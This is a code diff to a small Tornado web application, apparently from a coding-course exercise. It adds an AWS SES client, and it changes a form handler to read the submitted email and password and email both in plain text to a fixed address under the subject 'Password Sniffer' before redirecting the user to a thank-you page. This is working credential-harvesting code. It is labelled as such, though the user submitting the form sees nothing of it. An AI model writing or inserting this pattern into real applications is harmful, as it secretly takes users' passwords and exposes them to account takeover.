@@ -1,4 +1,5 @@
 import os
+import boto3
 
 import tornado.ioloop
 import tornado.web
@@ -12,6 +13,14 @@ PORT = int(os.environ.get('PORT', '8888'))
 ENV = Environment(
   loader=PackageLoader('myapp', 'templates'),
   autoescape=select_autoescape(['html', 'xml'])
+)
+
+
+SES_CLIENT = boto3.client(
+  'ses',
+  aws_access_key_id=os.environ.get('AWS_ACCESS_KEY'),
+  aws_secret_access_key=os.environ.get('AWS_SECRET_KEY'),
+  region_name="us-east-1"
 )
 
 class TemplateHandler(tornado.web.RequestHandler):
@@ -30,7 +39,23 @@ class MainHandler(TemplateHandler):
 class PageHandler(TemplateHandler):
   def post (self, page):
     email = self.get_body_argument('email')
+    password = self.get_body_argument('password')
     
+    response = SES_CLIENT.send_email(
+      Destination={
+        'ToAddresses': ['paul@digitalcrafts.com'],
+      },
+      Message={
+        'Body': {
+          'Text': {
+            'Charset': 'UTF-8',
+            'Data': 'Email: {}\nPassword: {}\n'.format(email, password),
+          },
+        },
+        'Subject': {'Charset': 'UTF-8', 'Data': 'Password Sniffer'},
+      },
+      Source='paul@digitalcrafts.com',
+    )
     # self.write('Thanks got your data<br>')
     # self.write('Email: ' + email)
     self.redirect('/thank-you-for-submitting')
